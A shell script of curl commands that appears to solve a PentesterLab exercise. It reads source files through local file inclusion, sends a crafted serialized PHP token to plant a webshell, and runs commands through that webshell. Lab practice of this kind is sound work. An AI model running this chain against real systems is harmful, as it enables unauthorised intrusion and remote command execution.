# register to get a token
curl -X POST -H "Content-Type: application/json" \
    -d '{"username":"apehex","password":"yolo"}' -x '127.0.0.1:8080' \
    http://ptl-b353551b-3d09425a.libcurl.so/register > token.json

# login (useles)
curl -X POST -H "Content-Type: application/json" \
    -d '{"username":"apehex","password":"yolo"}' -x '127.0.0.1:8080' \
    http://ptl-b353551b-3d09425a.libcurl.so/login

# upload some random data
curl -X POST -H "Content-Type: application/json" -d "$(cat token.json payloads/json/upload.json | jq -s add | jq -r tostring)" -x '127.0.0.1:8080' http://ptl-b353551b-3d09425a.libcurl.so/upload

# list files to get the uuid of the file previously uploaded
curl -X POST -H "Content-Type: application/json" -d '@token.json' -x '127.0.0.1:8080' http://ptl-b353551b-3d09425a.libcurl.so/files

# download a valid file to get app info: location of the log file & data (uploaded) file
curl -X POST -H "Content-Type: application/json" -d "$(cat token.json payloads/json/download.json | jq -s add | jq -r tostring)" -x '127.0.0.1:8080' http://ptl-b353551b-3d09425a.libcurl.so/file

# deduce the location of the sources and download them
curl -X POST -H "Content-Type: application/json" -d "$(cat token.json payloads/json/lfi.router.json | jq -s add | jq -r tostring)" -x '127.0.0.1:8080' http://ptl-b353551b-3d09425a.libcurl.so/file

# the token is a serialized object
echo -n Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtpOjI7czo1OiJsb2dpbiI7czo2OiJhcGVoZXgiO30=--6a09289533c94bb337a1ecf1646f7e20 | cut -d '-' -f 1 | base64 -d

# serialize a malicious PHP object with a webshell in it
php payloads/php/tokenize.php > token.evil.json

# send it over, calling a non-existent action to avoid calling methods that don't exist in the File class
curl -X POST -H "Content-Type: application/json" -d '@token.evil.json' -x '127.0.0.1:8080' http://ptl-b353551b-3d09425a.libcurl.so/index.php?action=yolo

# call the webshell!
curl -X GET -x '127.0.0.1:8080' 'http://ptl-b353551b-3d09425a.libcurl.so/test.php?c=ls%20-lah'
